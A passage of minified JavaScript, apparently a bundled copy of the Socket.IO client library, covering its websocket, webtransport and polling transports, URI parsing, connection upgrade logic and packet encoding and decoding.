                "undefined" != typeof document && (this.index = u.requestsCount++, u.requests[this.index] = this)
            }
            onError(U) {
                this.emitReserved("error", U, this.xhr), this.cleanup(!0)
            }
            cleanup(U) {
                if (void 0 !== this.xhr && null !== this.xhr) {
                    if (this.xhr.onreadystatechange = i, U) try {
                        this.xhr.abort()
                    } catch (U) {}
                    "undefined" != typeof document && delete u.requests[this.index], this.xhr = null
                }
            }
            onLoad() {
                const U = this.xhr.responseText;
                null !== U && (this.emitReserved("data", U), this.emitReserved("success"), this.cleanup())
            }
            abort() {
                this.cleanup()
            }
        }

        function g() {
            for (let U in u.requests) u.requests.hasOwnProperty(U) && u.requests[U].abort()
        }
        u.requestsCount = 0, u.requests = {}, "undefined" != typeof document && ("function" == typeof attachEvent ? attachEvent("onunload", g) : "function" == typeof addEventListener && addEventListener("onpagehide" in m ? "pagehide" : "unload", g, !1));
        const P = "function" == typeof Promise && "function" == typeof Promise.resolve ? U => Promise.resolve().then(U) : (U, F) => F(U, 0),
            A = m.WebSocket || m.MozWebSocket,
            f = "undefined" != typeof navigator && "string" == typeof navigator.product && "reactnative" === navigator.product.toLowerCase(),
            q = {
                websocket: class extends O {
                    constructor(U) {
                        super(U), this.supportsBinary = !U.forceBase64
                    }
                    get name() {
                        return "websocket"
                    }
                    doOpen() {
                        if (!this.check()) return;
                        const U = this.uri(),
                            F = this.opts.protocols,
                            Q = f ? {} : G(this.opts, "agent", "perMessageDeflate", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "localAddress", "protocolVersion", "origin", "maxPayload", "family", "checkServerIdentity");
                        this.opts.extraHeaders && (Q.headers = this.opts.extraHeaders);
                        try {
                            this.ws = f ? new A(U, F, Q) : F ? new A(U, F) : new A(U)
                        } catch (U) {
                            return this.emitReserved("error", U)
                        }
                        this.ws.binaryType = this.socket.binaryType, this.addEventListeners()
                    }
                    addEventListeners() {
                        this.ws.onopen = () => {
                            this.opts.autoUnref && this.ws._socket.unref(), this.onOpen()
                        }, this.ws.onclose = U => this.onClose({
                            description: "websocket connection closed",
                            context: U
                        }), this.ws.onmessage = U => this.onData(U.data), this.ws.onerror = U => this.onError("websocket error", U)
                    }
                    write(U) {
                        this.writable = !1;
                        for (let F = 0; F < U.length; F++) {
                            const Q = U[F],
                                B = F === U.length - 1;
                            J(Q, this.supportsBinary, (U => {
                                try {
                                    this.ws.send(U)
                                } catch (U) {}
                                B && P((() => {
                                    this.writable = !0, this.emitReserved("drain")
                                }), this.setTimeoutFn)
                            }))
                        }
                    }
                    doClose() {
                        void 0 !== this.ws && (this.ws.close(), this.ws = null)
                    }
                    uri() {
                        const U = this.opts.secure ? "wss" : "ws",
                            F = this.query || {};
                        return this.opts.timestampRequests && (F[this.opts.timestampParam] = s()), this.supportsBinary || (F.b64 = 1), this.createUri(U, F)
                    }
                    check() {
                        return !!A
                    }
                },
                webtransport: class extends O {
                    get name() {
                        return "webtransport"
                    }
                    doOpen() {
                        "function" == typeof WebTransport && (this.transport = new WebTransport(this.createUri("https"), this.opts.transportOptions[this.name]), this.transport.closed.then((() => {
                            this.onClose()
                        })).catch((U => {
                            this.onError("webtransport error", U)
                        })), this.transport.ready.then((() => {
                            this.transport.createBidirectionalStream().then((U => {
                                const F = function(U, F) {
                                        t || (t = new TextDecoder);
                                        const Q = [];
                                        let B = 0,
                                            R = -1,
                                            V = !1;
                                        return new TransformStream({
                                            transform(l, N) {
                                                for (Q.push(l);;) {
                                                    if (0 === B) {
                                                        if (Y(Q) < 1) break;
                                                        const U = c(Q, 1);
                                                        V = !(128 & ~U[0]), R = 127 & U[0], B = R < 126 ? 3 : 126 === R ? 1 : 2
                                                    } else if (1 === B) {
                                                        if (Y(Q) < 2) break;
                                                        const U = c(Q, 2);
                                                        R = new DataView(U.buffer, U.byteOffset, U.length).getUint16(0), B = 3
                                                    } else if (2 === B) {
                                                        if (Y(Q) < 8) break;
                                                        const U = c(Q, 8),
                                                            F = new DataView(U.buffer, U.byteOffset, U.length),
                                                            V = F.getUint32(0);
                                                        if (V > Math.pow(2, 21) - 1) {
                                                            N.enqueue(d);
                                                            break
                                                        }
                                                        R = V * Math.pow(2, 32) + F.getUint32(4), B = 3
                                                    } else {
                                                        if (Y(Q) < R) break;
                                                        const U = c(Q, R);
                                                        N.enqueue(a(V ? U : t.decode(U), F)), B = 0
                                                    }
                                                    if (0 === R || R > U) {
                                                        N.enqueue(d);
                                                        break
                                                    }
                                                }
                                            }
                                        })
                                    }(Number.MAX_SAFE_INTEGER, this.socket.binaryType),
                                    Q = U.readable.pipeThrough(F).getReader(),
                                    B = new TransformStream({
                                        transform(U, F) {
                                            ! function(U, F) {
                                                Z && U.data instanceof Blob ? U.data.arrayBuffer().then(T).then(F) : W && (U.data instanceof ArrayBuffer || S(U.data)) ? F(T(U.data)) : J(U, !1, (U => {
                                                    n || (n = new TextEncoder), F(n.encode(U))
                                                }))
                                            }(U, (Q => {
                                                const B = Q.length;
                                                let R;
                                                if (B < 126) R = new Uint8Array(1), new DataView(R.buffer).setUint8(0, B);
                                                else if (B < 65536) {
                                                    R = new Uint8Array(3);
                                                    const U = new DataView(R.buffer);
                                                    U.setUint8(0, 126), U.setUint16(1, B)
                                                } else {
                                                    R = new Uint8Array(9);
                                                    const U = new DataView(R.buffer);
                                                    U.setUint8(0, 127), U.setBigUint64(1, BigInt(B))
                                                }
                                                U.data && "string" != typeof U.data && (R[0] |= 128), F.enqueue(R), F.enqueue(Q)
                                            }))
                                        }
                                    });
                                B.readable.pipeTo(U.writable), this.writer = B.writable.getWriter();
                                const R = () => {
                                    Q.read().then((({
                                        done: U,
                                        value: F
                                    }) => {
                                        U || (this.onPacket(F), R())
                                    })).catch((U => {}))
                                };
                                R();
                                const V = {
                                    type: "open"
                                };
                                this.query.sid && (V.data = `{"sid":"${this.query.sid}"}`), this.writer.write(V).then((() => this.onOpen()))
                            }))
                        })))
                    }
                    write(U) {
                        this.writable = !1;
                        for (let F = 0; F < U.length; F++) {
                            const Q = U[F],
                                B = F === U.length - 1;
                            this.writer.write(Q).then((() => {
                                B && P((() => {
                                    this.writable = !0, this.emitReserved("drain")
                                }), this.setTimeoutFn)
                            }))
                        }
                    }
                    doClose() {
                        var U;
                        null === (U = this.transport) || void 0 === U || U.close()
                    }
                },
                polling: class extends O {
                    constructor(U) {
                        if (super(U), this.polling = !1, "undefined" != typeof location) {
                            const F = "https:" === location.protocol;
                            let Q = location.port;
                            Q || (Q = F ? "443" : "80"), this.xd = "undefined" != typeof location && U.hostname !== location.hostname || Q !== U.port
                        }
                        const F = U && U.forceBase64;
                        this.supportsBinary = K && !F, this.opts.withCredentials && (this.cookieJar = void 0)
                    }
                    get name() {
                        return "polling"
                    }
                    doOpen() {
                        this.poll()
                    }
                    pause(U) {
                        this.readyState = "pausing";
                        const F = () => {
                            this.readyState = "paused", U()
                        };
                        if (this.polling || !this.writable) {
                            let U = 0;
                            this.polling && (U++, this.once("pollComplete", (function() {
                                --U || F()
                            }))), this.writable || (U++, this.once("drain", (function() {
                                --U || F()
                            })))
                        } else F()
                    }
                    poll() {
                        this.polling = !0, this.doPoll(), this.emitReserved("poll")
                    }
                    onData(U) {
                        ((U, F) => {
                            const Q = U.split(p),
                                B = [];
                            for (let U = 0; U < Q.length; U++) {
                                const R = a(Q[U], F);
                                if (B.push(R), "error" === R.type) break
                            }
                            return B
                        })(U, this.socket.binaryType).forEach((U => {
                            if ("opening" === this.readyState && "open" === U.type && this.onOpen(), "close" === U.type) return this.onClose({
                                description: "transport closed by the server"
                            }), !1;
                            this.onPacket(U)
                        })), "closed" !== this.readyState && (this.polling = !1, this.emitReserved("pollComplete"), "open" === this.readyState && this.poll())
                    }
                    doClose() {
                        const U = () => {
                            this.write([{
                                type: "close"
                            }])
                        };
                        "open" === this.readyState ? U() : this.once("open", U)
                    }
                    write(U) {
                        this.writable = !1, ((U, F) => {
                            const Q = U.length,
                                B = new Array(Q);
                            let R = 0;
                            U.forEach(((U, V) => {
                                J(U, !1, (U => {
                                    B[V] = U, ++R === Q && F(B.join(p))
                                }))
                            }))
                        })(U, (U => {
                            this.doWrite(U, (() => {
                                this.writable = !0, this.emitReserved("drain")
                            }))
                        }))
                    }
                    uri() {
                        const U = this.opts.secure ? "https" : "http",
                            F = this.query || {};
                        return !1 !== this.opts.timestampRequests && (F[this.opts.timestampParam] = s()), this.supportsBinary || F.sid || (F.b64 = 1), this.createUri(U, F)
                    }
                    request(U = {}) {
                        return Object.assign(U, {
                            xd: this.xd,
                            cookieJar: this.cookieJar
                        }, this.opts), new u(this.uri(), U)
                    }
                    doWrite(U, F) {
                        const Q = this.request({
                            method: "POST",
                            data: U
                        });
                        Q.on("success", F), Q.on("error", ((U, F) => {
                            this.onError("xhr post error", U, F)
                        }))
                    }
                    doPoll() {
                        const U = this.request();
                        U.on("data", this.onData.bind(this)), U.on("error", ((U, F) => {
                            this.onError("xhr poll error", U, F)
                        })), this.pollXhr = U
                    }
                }
            },
            _ = /^(?:(?![^:@\/?#]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@\/?#]*)(?::([^:@\/?#]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/,
            $ = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "anchor"];

        function UU(U) {
            if (U.length > 2e3) throw "URI too long";
            const F = U,
                Q = U.indexOf("["),
                B = U.indexOf("]"); - 1 != Q && -1 != B && (U = U.substring(0, Q) + U.substring(Q, B).replace(/:/g, ";") + U.substring(B, U.length));
            let R = _.exec(U || ""),
                V = {},
                l = 14;
            for (; l--;) V[$[l]] = R[l] || "";
            return -1 != Q && -1 != B && (V.source = F, V.host = V.host.substring(1, V.host.length - 1).replace(/;/g, ":"), V.authority = V.authority.replace("[", "").replace("]", "").replace(/;/g, ":"), V.ipv6uri = !0), V.pathNames = function(U, F) {
                const Q = F.replace(/\/{2,9}/g, "/").split("/");
                return "/" != F.slice(0, 1) && 0 !== F.length || Q.splice(0, 1), "/" == F.slice(-1) && Q.splice(Q.length - 1, 1), Q
            }(0, V.path), V.queryKey = function(U, F) {
                const Q = {};
                return F.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, (function(U, F, B) {
                    F && (Q[F] = B)
                })), Q
            }(0, V.query), V
        }
        class FU extends e {
            constructor(U, F = {}) {
                super(), this.binaryType = "arraybuffer", this.writeBuffer = [], U && "object" == typeof U && (F = U, U = null), U ? (U = UU(U), F.hostname = U.host, F.secure = "https" === U.protocol || "wss" === U.protocol, F.port = U.port, U.query && (F.query = U.query)) : F.host && (F.hostname = UU(F.host).host), C(this, F), this.secure = null != F.secure ? F.secure : "undefined" != typeof location && "https:" === location.protocol, F.hostname && !F.port && (F.port = this.secure ? "443" : "80"), this.hostname = F.hostname || ("undefined" != typeof location ? location.hostname : "localhost"), this.port = F.port || ("undefined" != typeof location && location.port ? location.port : this.secure ? "443" : "80"), this.transports = F.transports || ["polling", "websocket", "webtransport"], this.writeBuffer = [], this.prevBufferLen = 0, this.opts = Object.assign({
                    path: "/engine.io",
                    agent: !1,
                    withCredentials: !1,
                    upgrade: !0,
                    timestampParam: "t",
                    rememberUpgrade: !1,
                    addTrailingSlash: !0,
                    rejectUnauthorized: !0,
                    perMessageDeflate: {
                        threshold: 1024
                    },
                    transportOptions: {},
                    closeOnBeforeunload: !1
                }, F), this.opts.path = this.opts.path.replace(/\/$/, "") + (this.opts.addTrailingSlash ? "/" : ""), "string" == typeof this.opts.query && (this.opts.query = function(U) {
                    let F = {},
                        Q = U.split("&");
                    for (let U = 0, B = Q.length; U < B; U++) {
                        let B = Q[U].split("=");
                        F[decodeURIComponent(B[0])] = decodeURIComponent(B[1])
                    }
                    return F
                }(this.opts.query)), this.id = null, this.upgrades = null, this.pingInterval = null, this.pingTimeout = null, this.pingTimeoutTimer = null, "function" == typeof addEventListener && (this.opts.closeOnBeforeunload && (this.beforeunloadEventListener = () => {
                    this.transport && (this.transport.removeAllListeners(), this.transport.close())
                }, addEventListener("beforeunload", this.beforeunloadEventListener, !1)), "localhost" !== this.hostname && (this.offlineEventListener = () => {
                    this.onClose("transport close", {
                        description: "network connection lost"
                    })
                }, addEventListener("offline", this.offlineEventListener, !1))), this.open()
            }
            createTransport(U) {
                const F = Object.assign({}, this.opts.query);
                F.EIO = 4, F.transport = U, this.id && (F.sid = this.id);
                const Q = Object.assign({}, this.opts, {
                    query: F,
                    socket: this,
                    hostname: this.hostname,
                    secure: this.secure,
                    port: this.port
                }, this.opts.transportOptions[U]);
                return new q[U](Q)
            }
            open() {
                let U;
                if (this.opts.rememberUpgrade && FU.priorWebsocketSuccess && -1 !== this.transports.indexOf("websocket")) U = "websocket";
                else {
                    if (0 === this.transports.length) return void this.setTimeoutFn((() => {
                        this.emitReserved("error", "No transports available")
                    }), 0);
                    U = this.transports[0]
                }
                this.readyState = "opening";
                try {
                    U = this.createTransport(U)
                } catch (U) {
                    return this.transports.shift(), void this.open()
                }
                U.open(), this.setTransport(U)
            }
            setTransport(U) {
                this.transport && this.transport.removeAllListeners(), this.transport = U, U.on("drain", this.onDrain.bind(this)).on("packet", this.onPacket.bind(this)).on("error", this.onError.bind(this)).on("close", (U => this.onClose("transport close", U)))
            }
            probe(U) {
                let F = this.createTransport(U),
                    Q = !1;
                FU.priorWebsocketSuccess = !1;
                const B = () => {
                    Q || (F.send([{
                        type: "ping",
                        data: "probe"
                    }]), F.once("packet", (U => {
                        if (!Q)
                            if ("pong" === U.type && "probe" === U.data) {
                                if (this.upgrading = !0, this.emitReserved("upgrading", F), !F) return;
                                FU.priorWebsocketSuccess = "websocket" === F.name, this.transport.pause((() => {
                                    Q || "closed" !== this.readyState && (Z(), this.setTransport(F), F.send([{
                                        type: "upgrade"
                                    }]), this.emitReserved("upgrade", F), F = null, this.upgrading = !1, this.flush())
                                }))
                            } else {
                                const U = new Error("probe error");
                                U.transport = F.name, this.emitReserved("upgradeError", U)
                            }
                    })))
                };

                function R() {
                    Q || (Q = !0, Z(), F.close(), F = null)
                }
                const V = U => {
                    const Q = new Error("probe error: " + U);
                    Q.transport = F.name, R(), this.emitReserved("upgradeError", Q)
                };

                function l() {
                    V("transport closed")
                }

                function N() {
                    V("socket closed")
                }

                function d(U) {
                    F && U.name !== F.name && R()
                }
                const Z = () => {
                    F.removeListener("open", B), F.removeListener("error", V), F.removeListener("close", l), this.off("close", N), this.off("upgrading", d)
                };
                F.once("open", B), F.once("error", V), F.once("close", l), this.once("close", N), this.once("upgrading", d), -1 !== this.upgrades.indexOf("webtransport") && "webtransport" !== U ? this.setTimeoutFn((() => {
                    Q || F.open()
                }), 200) : F.open()
            }
            onOpen() {
                if (this.readyState = "open", FU.priorWebsocketSuccess = "websocket" === this.transport.name, this.emitReserved("open"), this.flush(), "open" === this.readyState && this.opts.upgrade) {
                    let U = 0;
                    const F = this.upgrades.length;
                    for (; U < F; U++) this.probe(this.upgrades[U])
                }
            }
            onPacket(U) {
                if ("opening" === this.readyState || "open" === this.readyState || "closing" === this.readyState) switch (this.emitReserved("packet", U), this.emitReserved("heartbeat"), this.resetPingTimeout(), U.type) {
                    case "open":
                        this.onHandshake(JSON.parse(U.data));
                        break;
                    case "ping":
                        this.sendPacket("pong"), this.emitReserved("ping"), this.emitReserved("pong");
                        break;
                    case "error":
                        const F = new Error("server error");
                        F.code = U.data, this.onError(F);
                        break;
                    case "message":
                        this.emitReserved("data", U.data), this.emitReserved("message", U.data)
                }
            }
            onHandshake(U) {
                this.emitReserved("handshake", U), this.id = U.sid, this.transport.query.sid = U.sid, this.upgrades = this.filterUpgrades(U.upgrades), this.pingInterval = U.pingInterval, this.pingTimeout = U.pingTimeout, this.maxPayload = U.maxPayload, this.onOpen(), "closed" !== this.readyState && this.resetPingTimeout()
            }
            resetPingTimeout() {
                this.clearTimeoutFn(this.pingTimeoutTimer), this.pingTimeoutTimer = this.setTimeoutFn((() => {
                    this.onClose("ping timeout")
                }), this.pingInterval + this.pingTimeout), this.opts.autoUnref && this.pingTimeoutTimer.unref()
            }
            onDrain() {
                this.writeBuffer.splice(0, this.prevBufferLen), this.prevBufferLen = 0, 0 === this.writeBuffer.length ? this.emitReserved("drain") : this.flush()
            }
            flush() {
                if ("closed" !== this.readyState && this.transport.writable && !this.upgrading && this.writeBuffer.length) {
                    const U = this.getWritablePackets();
                    this.transport.send(U), this.prevBufferLen = U.length, this.emitReserved("flush")
                }
            }
            getWritablePackets() {
                if (!(this.maxPayload && "polling" === this.transport.name && this.writeBuffer.length > 1)) return this.writeBuffer;
                let U = 1;
                for (let Q = 0; Q < this.writeBuffer.length; Q++) {
                    const B = this.writeBuffer[Q].data;
                    if (B && (U += "string" == typeof(F = B) ? function(U) {
                            let F = 0,
                                Q = 0;
                            for (let B = 0, R = U.length; B < R; B++) F = U.charCodeAt(B), F < 128 ? Q += 1 : F < 2048 ? Q += 2 : F < 55296 || F >= 57344 ? Q += 3 : (B++, Q += 4);
                            return Q
                        }(F) : Math.ceil(1.33 * (F.byteLength || F.size))), Q > 0 && U > this.maxPayload) return this.writeBuffer.slice(0, Q);
                    U += 2
                }
                var F;
                return this.writeBuffer
            }
            write(U, F, Q) {
                return this.sendPacket("message", U, F, Q), this
            }
            send(U, F, Q) {
                return this.sendPacket("message", U, F, Q), this
            }
            sendPacket(U, F, Q, B) {
                if ("function" == typeof F && (B = F, F = void 0), "function" == typeof Q && (B = Q, Q = null), "closing" === this.readyState || "closed" === this.readyState) return;
                (Q = Q || {}).compress = !1 !== Q.compress;
                const R = {
                    type: U,
                    data: F,
                    options: Q
                };
                this.emitReserved("packetCreate", R), this.writeBuffer.push(R), B && this.once("flush", B), this.flush()
            }
            close() {
                const U = () => {
                        this.onClose("forced close"), this.transport.close()
                    },
                    F = () => {
                        this.off("upgrade", F), this.off("upgradeError", F), U()
                    },
                    Q = () => {
                        this.once("upgrade", F), this.once("upgradeError", F)
                    };
                return "opening" !== this.readyState && "open" !== this.readyState || (this.readyState = "closing", this.writeBuffer.length ? this.once("drain", (() => {
                    this.upgrading ? Q() : U()
                })) : this.upgrading ? Q() : U()), this
            }
            onError(U) {
                FU.priorWebsocketSuccess = !1, this.emitReserved("error", U), this.onClose("transport error", U)
            }
            onClose(U, F) {
                "opening" !== this.readyState && "open" !== this.readyState && "closing" !== this.readyState || (this.clearTimeoutFn(this.pingTimeoutTimer), this.transport.removeAllListeners("close"), this.transport.close(), this.transport.removeAllListeners(), "function" == typeof removeEventListener && (removeEventListener("beforeunload", this.beforeunloadEventListener, !1), removeEventListener("offline", this.offlineEventListener, !1)), this.readyState = "closed", this.id = null, this.emitReserved("close", U, F), this.writeBuffer = [], this.prevBufferLen = 0)
            }
            filterUpgrades(U) {
                const F = [];
                let Q = 0;
                const B = U.length;
                for (; Q < B; Q++) ~this.transports.indexOf(U[Q]) && F.push(U[Q]);
                return F
            }
        }
        FU.protocol = 4, FU.protocol;
        const QU = "function" == typeof ArrayBuffer,
            BU = U => "function" == typeof ArrayBuffer.isView ? ArrayBuffer.isView(U) : U.buffer instanceof ArrayBuffer,
            RU = Object.prototype.toString,
            VU = "function" == typeof Blob || "undefined" != typeof Blob && "[object BlobConstructor]" === RU.call(Blob),
            lU = "function" == typeof File || "undefined" != typeof File && "[object FileConstructor]" === RU.call(File);

        function NU(U) {
            return QU && (U instanceof ArrayBuffer || BU(U)) || VU && U instanceof Blob || lU && U instanceof File
        }

        function dU(U, F) {
            if (!U || "object" != typeof U) return !1;
            if (Array.isArray(U)) {
                for (let F = 0, Q = U.length; F < Q; F++)
                    if (dU(U[F])) return !0;
                return !1
            }
            if (NU(U)) return !0;
            if (U.toJSON && "function" == typeof U.toJSON && 1 === arguments.length) return dU(U.toJSON(), !0);
            for (const F in U)
                if (Object.prototype.hasOwnProperty.call(U, F) && dU(U[F])) return !0;
            return !1
        }

        function ZU(U) {
            const F = [],
                Q = U.data,
                B = U;
            return B.data = WU(Q, F), B.attachments = F.length, {
                packet: B,
                buffers: F
            }
        }

        function WU(U, F) {
            if (!U) return U;
            if (NU(U)) {
                const Q = {
                    _placeholder: !0,
                    num: F.length
                };
                return F.push(U), Q
            }
            if (Array.isArray(U)) {
                const Q = new Array(U.length);
                for (let B = 0; B < U.length; B++) Q[B] = WU(U[B], F);
                return Q
            }
            if ("object" == typeof U && !(U instanceof Date)) {
                const Q = {};
                for (const B in U) Object.prototype.hasOwnProperty.call(U, B) && (Q[B] = WU(U[B], F));
                return Q
            }
            return U
        }

        function SU(U, F) {
            return U.data = JU(U.data, F), delete U.attachments, U
        }

        function JU(U, F) {
            if (!U) return U;
            if (U && !0 === U._placeholder) {
                if ("number" == typeof U.num && U.num >= 0 && U.num < F.length) return F[U.num];
                throw new Error("illegal attachments")
            }
            if (Array.isArray(U))
                for (let Q = 0; Q < U.length; Q++) U[Q] = JU(U[Q], F);
            else if ("object" == typeof U)
                for (const Q in U) Object.prototype.hasOwnProperty.call(U, Q) && (U[Q] = JU(U[Q], F));
            return U
        }
        const EU = ["connect", "connect_error", "disconnect", "disconnecting", "newListener", "removeListener"],
            TU = 5;
        var nU;
        ! function(U) {
            U[U.CONNECT = 0] = "CONNECT", U[U.DISCONNECT = 1] = "DISCONNECT", U[U.EVENT = 2] = "EVENT", U[U.ACK = 3] = "ACK", U[U.CONNECT_ERROR = 4] = "CONNECT_ERROR", U[U.BINARY_EVENT = 5] = "BINARY_EVENT", U[U.BINARY_ACK = 6] = "BINARY_ACK"
        }(nU || (nU = {}));
        class kU {
            constructor(U) {
                this.replacer = U
            }
            encode(U) {
                return U.type !== nU.EVENT && U.type !== nU.ACK || !dU(U) ? [this.encodeAsString(U)] : this.encodeAsBinary({
                    type: U.type === nU.EVENT ? nU.BINARY_EVENT : nU.BINARY_ACK,
                    nsp: U.nsp,
                    data: U.data,
                    id: U.id
                })
            }
            encodeAsString(U) {
                let F = "" + U.type;
                return U.type !== nU.BINARY_EVENT && U.type !== nU.BINARY_ACK || (F += U.attachments + "-"), U.nsp && "/" !== U.nsp && (F += U.nsp + ","), null != U.id && (F += U.id), null != U.data && (F += JSON.stringify(U.data, this.replacer)), F
            }
            encodeAsBinary(U) {
                const F = ZU(U),
                    Q = this.encodeAsString(F.packet),
                    B = F.buffers;
                return B.unshift(Q), B
            }
        }

        function MU(U) {
            return "[object Object]" === Object.prototype.toString.call(U)
        }
        class aU extends e {
            constructor(U) {
                super(), this.reviver = U
            }
            add(U) {
                let F;
                if ("string" == typeof U) {
                    if (this.reconstructor) throw new Error("got plaintext data when reconstructing a packet");
                    F = this.decodeString(U);
                    const Q = F.type === nU.BINARY_EVENT;
                    Q || F.type === nU.BINARY_ACK ? (F.type = Q ? nU.EVENT : nU.ACK, this.reconstructor = new DU(F), 0 === F.attachments && super.emitReserved("decoded", F)) : super.emitReserved("decoded", F)
                } else {
                    if (!NU(U) && !U.base64) throw new Error("Unknown type: " + U);
                    if (!this.reconstructor) throw new Error("got binary data when not reconstructing a packet");
                    F = this.reconstructor.takeBinaryData(U), F && (this.reconstructor = null, super.emitReserved("decoded", F))
                }
            }
            decodeString(U) {
                let F = 0;
                const Q = {
                    type: Number(U.charAt(0))
                };
                if (void 0 === nU[Q.type]) throw new Error("unknown packet type " + Q.type);
                if (Q.type === nU.BINARY_EVENT || Q.type === nU.BINARY_ACK) {
                    const B = F + 1;
                    for (;
                        "-" !== U.charAt(++F) && F != U.length;);
                    const R = U.substring(B, F);
                    if (R != Number(R) || "-" !== U.charAt(F)) throw new Error("Illegal attachments");
                    Q.attachments = Number(R)
                }
                if ("/" === U.charAt(F + 1)) {
                    const B = F + 1;
                    for (; ++F && "," !== U.charAt(F) && F !== U.length;);
                    Q.nsp = U.substring(B, F)
                } else Q.nsp = "/";
                const B = U.charAt(F + 1);
                if ("" !== B && Number(B) == B) {
                    const B = F + 1;
                    for (; ++F;) {
                        const Q = U.charAt(F);
                        if (null == Q || Number(Q) != Q) {
                            --F;
                            break
                        }
                        if (F === U.length) break
                    }
                    Q.id = Number(U.substring(B, F + 1))
                }
                if (U.charAt(++F)) {
                    const B = this.tryParse(U.substr(F));
                    if (!aU.isPayloadValid(Q.type, B)) throw new Error("invalid payload");
                    Q.data = B
                }
                return Q
            }
            tryParse(U) {
                try {
                    return JSON.parse(U, this.reviver)
                } catch (U) {
                    return !1
                }
            }
            static isPayloadValid(U, F) {
                switch (U) {
                    case nU.CONNECT:
                        return MU(F);
                    case nU.DISCONNECT:
                        return void 0 === F;
                    case nU.CONNECT_ERROR:
                        return "string" == typeof F || MU(F);
                    case nU.EVENT:
                    case nU.BINARY_EVENT:
                        return Array.isArray(F) && ("number" == typeof F[0] || "string" == typeof F[0] && -1 === EU.indexOf(F[0]));
                    case nU.ACK:
                    case nU.BINARY_ACK:
                        return Array.isArray(F)
                }
            }
            destroy() {
                this.reconstructor && (this.reconstructor.finishedReconstruction(), this.reconstructor = null)
            }
        }
        class DU {
            constructor(U) {
                this.packet = U, this.buffers = [], this.reconPack = U
            }
            takeBinaryData(U) {
                if (this.buffers.push(U), this.buffers.length === this.reconPack.attachments) {
                    const U = SU(this.reconPack, this.buffers);
                    return this.finishedReconstruction(), U
                }
                return null
            }
            finishedReconstruction() {
                this.reconPack = null, this.buffers = []
            }
        }

        function hU(U, F, Q) {
            return U.on(F, Q),
                function() {
                    U.off(F, Q)
                }
        }
        const pU = Object.freeze({
            connect: 1,
            connect_error: 1,
            disconnect: 1,
            disconnecting: 1,
            newListener: 1,
            removeListener: 1
        });
        class tU extends e {
            constructor(U, F, Q) {
                super(), this.connected = !1, this.recovered = !1, this.receiveBuffer = [], this.sendBuffer = [], this._queue = [], this._queueSeq = 0, this.ids = 0, this.acks = {}, this.flags = {}, this.io = U, this.nsp = F, Q && Q.auth && (this.auth = Q.auth), this._opts = Object.assign({}, Q), this.io._autoConnect && this.open()
            }
            get disconnected() {
                return !this.connected
            }
            subEvents() {
                if (this.subs) return;
                const U = this.io;
                this.subs = [hU(U, "open", this.onopen.bind(this)), hU(U, "packet", this.onpacket.bind(this)), hU(U, "error", this.onerror.bind(this)), hU(U, "close", this.onclose.bind(this))]
            }
            get active() {
                return !!this.subs
            }
            connect() {
                return this.connected || (this.subEvents(), this.io._reconnecting || this.io.open(), "open" === this.io._readyState && this.onopen()), this
            }
            open() {
                return this.connect()
            }
            send(...U) {
                return U.unshift("message"), this.emit.apply(this, U), this
            }
            emit(U, ...F) {
                if (pU.hasOwnProperty(U)) throw new Error('"' + U.toString() + '" is a reserved event name');
                if (F.unshift(U), this._opts.retries && !this.flags.fromQueue && !this.flags.volatile) return this._addToQueue(F), this;
                const Q = {
                    type: nU.EVENT,
                    data: F,
                    options: {}
                };
                if (Q.options.compress = !1 !== this.flags.compress, "function" == typeof F[F.length - 1]) {
                    const U = this.ids++,
                        B = F.pop();
                    this._registerAckCallback(U, B), Q.id = U
                }
                const B = this.io.engine && this.io.engine.transport && this.io.engine.transport.writable;
                return this.flags.volatile && (!B || !this.connected) || (this.connected ? (this.notifyOutgoingListeners(Q), this.packet(Q)) : this.sendBuffer.push(Q)), this.flags = {}, this
            }
            _registerAckCallback(U, F) {
                var Q;
                const B = null !== (Q = this.flags.timeout) && void 0 !== Q ? Q : this._opts.ackTimeout;
                if (void 0 === B) return void(this.acks[U] = F);
                const R = this.io.setTimeoutFn((() => {
                        delete this.acks[U];
                        for (let F = 0; F < this.sendBuffer.length; F++) this.sendBuffer[F].id === U && this.sendBuffer.splice(F, 1);
                        F.call(this, new Error("operation has timed out"))
                    }), B),
                    V = (...U) => {
                        this.io.clearTimeoutFn(R), F.apply(this, U)
                    };
                V.withError = !0, this.acks[U] = V
            }
            emitWithAck(U, ...F) {
                return new Promise(((Q, B) => {
                    const R = (U, F) => U ? B(U) : Q(F);
                    R.withError = !0, F.push(R), this.emit(U, ...F)
                }))
            }
            _addToQueue(U) {
                let F;
                "function" == typeof U[U.length - 1] && (F = U.pop());
                const Q = {
                    id: this._queueSeq++,
                    tryCount: 0,
                    pending: !1,
                    args: U,
                    flags: Object.assign({
                        fromQueue: !0
                    }, this.flags)
                };
                U.push(((U, ...B) => {
                    if (Q === this._queue[0]) return null !== U ? Q.tryCount > this._opts.retries && (this._queue.shift(), F && F(U)) : (this._queue.shift(), F && F(null, ...B)), Q.pending = !1, this._drainQueue()
                })), this._queue.push(Q), this._drainQueue()
            }
            _drainQueue(U = !1) {
                if (!this.connected || 0 === this._queue.length) return;
                const F = this._queue[0];
                F.pending && !U || (F.pending = !0, F.tryCount++, this.flags = F.flags, this.emit.apply(this, F.args))
            }
            packet(U) {
                U.nsp = this.nsp, this.io._packet(U)
            }
            onopen() {
                "function" == typeof this.auth ? this.auth((U => {
                    this._sendConnectPacket(U)
                })) : this._sendConnectPacket(this.auth)
            }
            _sendConnectPacket(U) {
                this.packet({
                    type: nU.CONNECT,
                    data: this._pid ? Object.assign({
                        pid: this._pid,
                        offset: this._lastOffset
                    }, U) : U
                })
            }
            onerror(U) {
                this.connected || this.emitReserved("connect_error", U)
            }
            onclose(U, F) {
                this.connected = !1, delete this.id, this.emitReserved("disconnect", U, F), this._clearAcks()
            }
            _clearAcks() {
                Object.keys(this.acks).forEach((U => {
                    if (!this.sendBuffer.some((F => String(F.id) === U))) {
                        const F = this.acks[U];
                        delete this.acks[U], F.withError && F.call(this, new Error("socket has been disconnected"))
                    }
                }))
            }
            onpacket(U) {
                if (U.nsp === this.nsp) switch (U.type) {
                    case nU.CONNECT:
